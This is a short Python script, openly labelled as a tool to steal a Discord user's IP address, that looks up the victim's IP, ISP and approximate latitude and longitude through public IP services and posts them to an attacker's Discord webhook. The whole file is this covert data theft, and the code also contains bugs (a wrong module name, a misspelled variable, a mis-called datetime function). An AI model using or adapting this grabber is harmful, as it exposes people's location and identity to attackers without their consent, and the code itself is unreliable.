# steal a discord user's ip address and send it to 
# hacker via webhook

import requests
import dhooks
from dhooks import Webhook, Embed
import json
import datetime

hook = Webhook("https://discord.com/your-webhook-url")

# get ip from api.ipify.org
victimIp = request.get('https://api.ipify.org/').text
# get time
time = datetime.now().strftime("%H:%M %p")
# get location data from extreme-ip-lookup.com using victimIp 
geoLocationData = request.get(f'http://extreme-ip-lookup.com/json/{victimIp}')
# get geolocation data
geo = geoLocationData.json()
embed = Embed()
# create dictionary object and store geolocation data
dataToSend = [
    {"key": "time" , "value": time }, 
    {"key": "IP", "value": geo['query'] }, 
    {"key": "businessName", "value": geo['businessName'] }, 
    {"key": "businessWebsite", "value": geo['businessWebsite'] }, 
    {"key": "continent", "value": geo['continent'] }, 
    {"key": "countryCode", "value": geo['countryCode'] }, 
    {"key": "ipName", "value": geo['ipName'] }, 
    {"key": "ipType", "value": geo['ipType'] }, 
    {"key": "isp", "value": geo['isp'] }, 
    {"key": "lat", "value": geo['Lat'] }, 
    {"key": "Lon", "value": geo['Lon'] }, 
    {"key": "organization", "value": geo['org'] }, 
    {"key": "region", "value": geo['region'] }, 
    {"key": "status", "value": geo['status'] },
]
# embed data
for data in dataToSend: 
    if data['value']:
        emded.add_field(key=data['key'], value=data['value'], inline=True )
# send embedded data thru the web hook
hook.send(embed=embed)


